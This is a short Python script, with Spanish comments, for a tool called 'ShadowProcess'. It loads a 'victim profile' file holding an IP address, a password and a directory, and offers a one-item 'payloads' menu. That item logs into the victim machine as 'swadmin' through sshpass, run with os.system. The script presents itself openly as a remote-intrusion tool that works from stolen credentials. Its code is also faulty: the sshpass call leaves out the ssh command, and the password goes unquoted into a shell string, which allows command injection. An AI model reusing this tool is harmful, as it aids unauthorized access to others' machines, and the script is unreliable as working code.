#!/usr/bin/python3
#Consola de ShadowProcess - Tobiasasa

#Importando
import os
import sys
import getpass
import paramiko
from paramiko import SSHClient


#Variables
banner = """
\n	 __ _               _                   ___                             
	/ _\ |__   __ _  __| | _____      __   / _ \_ __ ___   ___ ___  ___ ___ 
	\ \| '_ \ / _` |/ _` |/ _ \ \ /\ / /  / /_)/ '__/ _ \ / __/ _ \/ __/ __| 
	_\ \ | | | (_| | (_| | (_) \ V  V /  / ___/| | | (_) | (_|  __/\__ \__ \ 
	\__/_| |_|\__,_|\__,_|\___/ \_/\_/   \/    |_|  \___/ \___\___||___/___/
						Creado por github.com/tobiasasa
"""

help_menu = """
Ingresar un perfil de victima .shp\n
FORMATO
* IP
* PASSWORD
* DIRECTORIO CONEXION
"""


options_menu = """
		[=] Selecione numero de payload a usar [=]

		Payloads:
			[0] Consola remota
"""

username = getpass.getuser()
header = f"{username}@shprocess $ "

#Leyendo archivo de configuracion
def read_config(config_file):
	configuration = {}
	
	#obteniendo contenido del archivo
	read_lines = open(config_file, "r").readlines()

	#cargando informacion de la victima
	configuration["IPADDRESS"] = read_lines[0].strip()
	configuration["PASSWORD"] = read_lines[1].strip()
	configuration["WORKINGDIRECTORY"] = read_lines[2].strip()

	return configuration

#Detectando sistema operativo
def os_detection():
	#windows
	if os.name == "nt":
		return "w"
	#Linux
	if os.name == "posix":
		return "l"

#Conectarse a la victima
def connect():
	configuration = read_config(sys.argv[1])

	#informacion de configuracion
	ipv4 = configuration.get("IPADDRESS")
	password = configuration.get("PASSWORD")
	working_directory = configuration.get("WORKINGDIRECTORY")

	#conexion remota
	os.system(f"sshpass -p \"{password}\" swadmin@{ipv4}")

	#client = SSHClient()
	#ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	#client.connect(ipv4, username='swadmin', password=sw_password)

#Interface de linea de comando
def cli(arguments):
	#mostrando banner
	print(banner)

	#si argumentos existen
	if arguments:
		print(options_menu)
		option = input(f"{header}")
		if option == "0":
			connect()
	#si argumentos no existen
	else:
		print(help_menu)

#Codigo principal
def main():

	#Comprobando arguemntos
	try:
		sys.argv[1]
	except IndexError:
		arguments_exist = False
	else:
		arguments_exist = True

	#Ejecutando linea de comandos
	cli(arguments_exist)

#Ejecutando codigo principal
if __name__ == "__main__":
	main()